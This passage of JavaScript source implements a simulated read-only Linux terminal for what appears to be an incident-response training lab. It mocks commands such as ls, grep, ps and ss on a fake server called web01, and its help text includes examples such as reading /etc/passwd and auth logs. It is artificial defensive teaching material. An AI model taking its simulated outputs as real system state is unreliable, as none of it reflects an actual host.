  ls [-l] [-a] [path]        list directory (try ls -la)
  cd <dir> | pwd             change / print directory
  cat <file...>              print files
  grep [-i -v -c -n -r -l -F] <pattern> [file...]   search (regex); reads stdin in a pipe
  head / tail [-n N] [file]  first / last lines (default 10)
  wc [-l] [file]             count lines (and words/bytes without -l)
  sort [-r -n -u] | uniq [-c]   sort lines / collapse duplicates
  cut -d<delim> -f<n>        pick fields, e.g. cut -d: -f1,3 /etc/passwd
  find <path> [-name pattern] [-type f|d]
  whoami | id | hostname | uname -a | date
  ps aux                     running processes
  ss -tulpn | ss -tanp       listening sockets / all TCP connections
  history | clear | echo
Pipes: cat /var/log/auth.log | grep Failed | wc -l
` };
      },
      pwd() { return { out: cwd + "\n" }; },
      whoami() { return { out: "analyst\n" }; },
      id() { return { out: "uid=1003(analyst) gid=1003(analyst) groups=1003(analyst),4(adm)\n" }; },
      hostname() { return { out: "web01\n" }; },
      date() { return { out: "Tue Oct 14 07:41:12 UTC 2025\n" }; },
      uname(a) { return { out: a.includes("-a") ? "Linux web01 5.15.0-105-generic #115-Ubuntu SMP x86_64 GNU/Linux\n" : "Linux\n" }; },
      echo(a) { return { out: a.join(" ") + "\n" }; },
      clear() { outEl.innerHTML = ""; return { out: "" }; },
      history() { return { out: cmdHistory.map((c, i) => `${String(i + 1).padStart(5)}  ${c}`).join("\n") + "\n" }; },
      cd(a) {
        const p = resolve(a[0] === undefined ? "~" : a[0]);
        if (!FS[p]) return { err: `cd: ${a[0]}: No such file or directory` };
        if (FS[p].type !== "d") return { err: `cd: ${a[0]}: Not a directory` };
        if (!readable(p)) return { err: `cd: ${a[0]}: Permission denied` };
        cwd = p; return { out: "" };
      },
      ls(a) {
        const { flags, rest } = parseFlags(a);
        const targets = rest.length ? rest : [""];
        const out = [], errs = [];
        targets.forEach((t, ti) => {
          const p = resolve(t), n = FS[p];
          if (!n) { errs.push(`ls: cannot access '${t}': No such file or directory`); return; }
          if (n.type === "f") { out.push(flags.has("l") ? lsLong(p, t) : t); return; }
          if (!readable(p)) { errs.push(`ls: cannot open directory '${t}': Permission denied`); return; }
          if (targets.length > 1) out.push((ti ? "\n" : "") + t + ":");
          let kids = children(p).filter((k) => flags.has("a") || !base(k).startsWith("."));
          if (flags.has("l")) {
            out.push(`total ${kids.length * 4}`);
            if (flags.has("a")) { out.push(lsLong(p, ".")); out.push(lsLong(p === "/" ? "/" : resolve(p + "/.."), "..")); }
            kids.forEach((k) => out.push(lsLong(k, base(k))));
          } else {
            const names = kids.map((k) => base(k));
            if (flags.has("a")) names.unshift(".", "..");
            if (names.length) out.push({ html: names.map((nm) => { const full = nm === "." || nm === ".." ? null : (p === "/" ? "/" : p + "/") + nm; return full && FS[full].type === "d" ? `<span class="lt-dir">${esc(nm)}</span>` : esc(nm); }).join("  "), text: names.join("  ") });
          }
        });
        return { lines: out, err: errs.join("\n") };
      },
      cat(a, stdin) {
        const { items, errs } = readInputs("cat", a.filter((x) => x !== "-n"), stdin);
        let text = items.map((i) => i.text).join("");
        if (a.includes("-n")) text = joinL(linesOf(text).map((l, i) => `${String(i + 1).padStart(6)}\t${l}`));
        return { out: text, err: errs.join("\n") };
      },
      grep(a, stdin) {
        const { flags, rest } = parseFlags(a);
        if (!rest.length) return { err: "Usage: grep [OPTION]... PATTERN [FILE]..." };
        const pat = rest[0];
        let files = rest.slice(1);
        let re;
        try { re = flags.has("F") ? null : new RegExp(pat, flags.has("i") ? "i" : ""); }
        catch (e) { re = null; }
        const test = (l) => re ? re.test(l) : (flags.has("i") ? l.toLowerCase().includes(pat.toLowerCase()) : l.includes(pat));
        const errs = [];
        if (flags.has("r") || flags.has("R")) {
          const roots = files.length ? files : ["."];
          files = [];
          roots.forEach((r) => {
            const p = resolve(r);
            if (!FS[p]) { errs.push(`grep: ${r}: No such file or directory`); return; }
            if (FS[p].type === "f") { files.push(r); return; }
            Object.keys(FS).sort().forEach((k) => {
              if ((k.startsWith(p === "/" ? "/" : p + "/")) && FS[k].type === "f") {
                if (!readable(k)) errs.push(`grep: ${k}: Permission denied`); else files.push(k);
              }
            });
          });
        } else {
          files.forEach((f) => { const p = resolve(f); if (FS[p] && FS[p].type === "d") errs.push(`grep: ${f}: Is a directory`); });
          files = files.filter((f) => { const p = resolve(f); return !(FS[p] && FS[p].type === "d"); });
        }
        const { items, errs: e2 } = readInputs("grep", files, stdin);
        const multi = items.length > 1;
        const out = [];
        items.forEach((it) => {
          const ls = linesOf(it.text);
          let c = 0;
          ls.forEach((l, i) => {
            if (test(l) !== flags.has("v")) {
              c++;
              if (!flags.has("c") && !flags.has("l")) out.push((multi ? it.name + ":" : "") + (flags.has("n") ? (i + 1) + ":" : "") + l);
            }
          });
          if (flags.has("c")) out.push((multi ? it.name + ":" : "") + c);
          if (flags.has("l") && c) out.push(it.name);
        });
        return { out: joinL(out), err: errs.concat(e2).join("\n") };
      },
      head(a, stdin) {
        const { n, rest } = numArg(a, 10);
        const { items, errs } = readInputs("head", rest, stdin);
        return { out: joinL(linesOf(items.map((i) => i.text).join("")).slice(0, n)), err: errs.join("\n") };
      },
      tail(a, stdin) {
        const { n, rest } = numArg(a, 10);
        const { items, errs } = readInputs("tail", rest, stdin);
        const l = linesOf(items.map((i) => i.text).join(""));
        return { out: joinL(n ? l.slice(-n) : []), err: errs.join("\n") };
      },
      wc(a, stdin) {
        const { flags, rest } = parseFlags(a);
        const { items, errs } = readInputs("wc", rest, stdin);
        const out = items.map((it) => {
          const l = linesOf(it.text).length;
          const w = (it.text.match(/\S+/g) || []).length;
          const nm = it.name ? " " + it.name : "";
          if (flags.has("l")) return l + nm;
          if (flags.has("w")) return w + nm;
          if (flags.has("c")) return it.text.length + nm;
          return `${String(l).padStart(7)} ${String(w).padStart(7)} ${String(it.text.length).padStart(7)}${nm}`;
        });
        return { out: joinL(out), err: errs.join("\n") };
      },
      sort(a, stdin) {
        const { flags, rest } = parseFlags(a);
        const { items, errs } = readInputs("sort", rest, stdin);
        let l = linesOf(items.map((i) => i.text).join(""));
        if (flags.has("n")) l.sort((x, y) => (parseFloat(x) || 0) - (parseFloat(y) || 0));
        else l.sort();
        if (flags.has("r")) l.reverse();
        if (flags.has("u")) l = l.filter((x, i) => i === 0 || x !== l[i - 1]);
        return { out: joinL(l), err: errs.join("\n") };
      },
      uniq(a, stdin) {
        const { flags, rest } = parseFlags(a);
        const { items, errs } = readInputs("uniq", rest, stdin);
        const l = linesOf(items.map((i) => i.text).join(""));
        const out = [];
        l.forEach((x) => { const last = out[out.length - 1]; if (last && last.v === x) last.c++; else out.push({ v: x, c: 1 }); });
        return { out: joinL(out.map((o) => flags.has("c") ? `${String(o.c).padStart(7)} ${o.v}` : o.v)), err: errs.join("\n") };
      },
      cut(a, stdin) {
        let d = "\t", f = null; const rest = [];
        for (let i = 0; i < a.length; i++) {
          const x = a[i];
          if (x === "-d") d = a[++i]; else if (x.startsWith("-d")) d = x.slice(2);
          else if (x === "-f") f = a[++i]; else if (x.startsWith("-f")) f = x.slice(2);
          else rest.push(x);
        }
        if (!f) return { err: "cut: you must specify a list of fields (-f)" };
        const idx = f.split(",").map((n) => parseInt(n, 10) - 1);
        const { items, errs } = readInputs("cut", rest, stdin);
        const l = linesOf(items.map((i) => i.text).join(""));
        return { out: joinL(l.map((line) => { const p = line.split(d || "\t"); return idx.map((i) => p[i] === undefined ? "" : p[i]).join(d); })), err: errs.join("\n") };
      },
      find(a) {
        let root = ".", name = null, type = null;
        const args = a.slice();
        if (args[0] && !args[0].startsWith("-")) root = args.shift();
        for (let i = 0; i < args.length; i++) {
          if (args[i] === "-name" || args[i] === "-iname") { name = { re: globToRe(args[i + 1] || "*"), i: args[i] === "-iname" }; if (name.i) name.re = new RegExp(name.re.source, "i"); i++; }
          else if (args[i] === "-type") { type = args[++i]; }
          else return { err: `find: unknown predicate '${args[i]}'` };
        }
        const p = resolve(root);
        if (!FS[p]) return { err: `find: '${root}': No such file or directory` };
        const out = [], errs = [];
        const rootDisp = root.length > 1 ? root.replace(/\/+$/, "") : root;
        const display = (k) => p === "/" ? (rootDisp === "/" ? k : rootDisp + k) : rootDisp + k.slice(p.length);
        Object.keys(FS).sort().forEach((k) => {
          if (k !== p && !k.startsWith(p === "/" ? "/" : p + "/")) return;
          if ((k === "/root" || k.startsWith("/root/")) && k !== "/root") { return; }
          if (name && !name.re.test(base(k))) return;
          if (type && FS[k].type !== type) return;
          out.push(k === p ? root : display(k));
        });
        if (p === "/" || p === "/root") errs.push("find: '/root': Permission denied");
        return { out: joinL(out), err: errs.join("\n") };
      },
      ps(a) {
        const hdr = "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND";
        const rows = PS.map((r) => `${r[0].padEnd(10)} ${String(r[1]).padStart(5)} ${r[2].padStart(4)} ${r[3].padStart(4)} ${r[4].padStart(7)} ${r[5].padStart(6)} ${r[6].padEnd(8)} ${r[7].padEnd(4)} ${r[8].padEnd(5)} ${r[9].padStart(6)} ${r[10]}`);
        if (!a.length) return { out: joinL(["    PID TTY          TIME CMD", "   3201 pts/0    00:00:00 bash", "   3255 pts/0    00:00:00 ps"]) };
        return { out: joinL([hdr].concat(rows)) };
      },
      ss(a) {
        const { flags } = parseFlags(a);
        const listen = flags.has("l"), all = flags.has("a");
        let rows = SOCK.filter((s) => {
          if (flags.has("t") && !flags.has("u") && s[0] !== "tcp") return false;
          if (flags.has("u") && !flags.has("t") && s[0] !== "udp") return false;
          const isL = s[1] === "LISTEN" || s[1] === "UNCONN";
          if (all) return true;
          return listen ? isL : !isL;
        });
        const out = [`Netid State   Recv-Q Send-Q  Local Address:Port      Peer Address:Port   ${flags.has("p") ? "Process" : ""}`];
        rows.forEach((s) => out.push(`${s[0].padEnd(5)} ${s[1].padEnd(7)} 0      ${s[1] === "LISTEN" ? "128" : "0  "}     ${s[2].padEnd(23)} ${s[3].padEnd(19)} ${flags.has("p") ? s[4] : ""}`));
        return { out: joinL(out) };
      },
      netstat(a) { return COMMANDS.ss(a); },
      sudo() { return { err: "analyst is not in the sudoers file.  This incident will be reported." }; },
      rm() { return { err: "rm: refusing to modify evidence (this lab is read-only)" }; },
      vi() { return { err: "Editors are disabled in this lab - use cat/less-style reading instead." } },
      less(a, stdin) { return COMMANDS.cat(a, stdin); },
      more(a, stdin) { return COMMANDS.cat(a, stdin); },
      ll(a, stdin) { return COMMANDS.ls(["-la"].concat(a), stdin); }
    };
    COMMANDS.nano = COMMANDS.vi; COMMANDS.vim = COMMANDS.vi;

    function run(line) {
      const segs = splitPipes(line);
      let stdin = null, result = { out: "" };
      const errs = [];
      for (let i = 0; i < segs.length; i++) {
        let toks;
        try { toks = tokenize(segs[i]); } catch (e) { return { err: "bash: " + e.message }; }
        if (!toks.length) { if (segs.length > 1) return { err: "bash: syntax error near unexpected token `|'" }; return { out: "" }; }
        const [cmd, ...args] = toks;
        const fn = Object.prototype.hasOwnProperty.call(COMMANDS, cmd) ? COMMANDS[cmd] : null;
        if (!fn) return { err: `${cmd}: command not found  (type 'help')`, prevErr: errs };
        result = fn(args, stdin) || { out: "" };
        if (result.err) errs.push(result.err);
        stdin = result.lines ? joinL(result.lines.map((l) => typeof l === "string" ? l : l.text)) : (result.out || "");
      }
      return { out: result.out, lines: result.lines, err: errs.join("\n") };
    }

    function print(text, cls) {
      linesOf(text).forEach((l) => {
        const d = document.createElement("div");
        d.className = "term-line" + (cls ? " " + cls : "");
        d.textContent = l;
        outEl.appendChild(d);
      });
    }
    function printLines(lines) {
      lines.forEach((l) => {
        const d = document.createElement("div");
        d.className = "term-line";
        if (typeof l === "string") d.textContent = l; else d.innerHTML = l.html;
        outEl.appendChild(d);
      });
    }
    function execute(line) {
      const echo = document.createElement("div");
      echo.className = "term-line";
      echo.innerHTML = `<span class="lt-prompt">${esc(promptStr())}</span>${esc(line)}`;
      outEl.appendChild(echo);
      if (line.trim()) { cmdHistory.push(line); history.push(line); }
      hIdx = history.length;
      const r = run(line);
      if (r.err) print(r.err + "\n", "lt-err");
      if (r.lines) printLines(r.lines); else if (r.out) print(r.out);
      setPrompt();
      termEl.scrollTop = termEl.scrollHeight;
    }

    function complete() {
      const v = inEl.value;
      const m = v.match(/(\S*)$/);
      const word = m[1];
      const slash = word.lastIndexOf("/");
      const dirPart = slash >= 0 ? word.slice(0, slash + 1) : "";
      const partial = slash >= 0 ? word.slice(slash + 1) : word;
      const dir = resolve(dirPart || ".");
      if (!FS[dir] || FS[dir].type !== "d") return;
      const isFirst = !v.slice(0, v.length - word.length).trim();
      let cands = children(dir).map(base).filter((n) => n.startsWith(partial) && (partial.startsWith(".") || !n.startsWith(".")));
      if (isFirst && !dirPart) cands = Object.keys(COMMANDS).filter((c) => c.startsWith(partial));
      if (cands.length === 1) {
        const full = (dir === "/" ? "/" : dir + "/") + cands[0];
        const suffix = !isFirst && FS[full] && FS[full].type === "d" ? "/" : " ";
        inEl.value = v.slice(0, v.length - partial.length) + cands[0] + suffix;
      } else if (cands.length > 1) {
        let pre = cands[0];
        cands.forEach((c) => { while (!c.startsWith(pre)) pre = pre.slice(0, -1); });
        if (pre.length > partial.length) inEl.value = v.slice(0, v.length - partial.length) + pre;
        else { print(promptStr() + v + "\n"); print(cands.join("  ") + "\n"); termEl.scrollTop = termEl.scrollHeight; }
      }
    }

    inEl.addEventListener("keydown", (e) => {
      if (e.key === "Enter") { e.preventDefault(); const l = inEl.value; inEl.value = ""; execute(l); }
      else if (e.key === "ArrowUp") { e.preventDefault(); if (hIdx > 0) { hIdx--; inEl.value = history[hIdx]; } }
      else if (e.key === "ArrowDown") { e.preventDefault(); if (hIdx < history.length - 1) { hIdx++; inEl.value = history[hIdx]; } else { hIdx = history.length; inEl.value = ""; } }
      else if (e.key === "Tab") { e.preventDefault(); complete(); }
      else if (e.key === "l" && e.ctrlKey) { e.preventDefault(); outEl.innerHTML = ""; }
    });
    termEl.addEventListener("click", () => { if (!window.getSelection().toString()) inEl.focus(); });

    print("Ubuntu 22.04.4 LTS web01 - IR read-only session\nLast login: Tue Oct 14 07:35:02 2025 from 10.0.5.31\nType 'help' for available commands. Start with: cat TICKET.txt\n\n");
    setPrompt();

    // test hook (harmless): lets automated tests drive the shell
    container._cpRun = (line) => { const r = run(line); return { out: r.lines ? joinL(r.lines.map((l) => typeof l === "string" ? l : l.text)) : (r.out || ""), err: r.err || "" }; };
  }
});
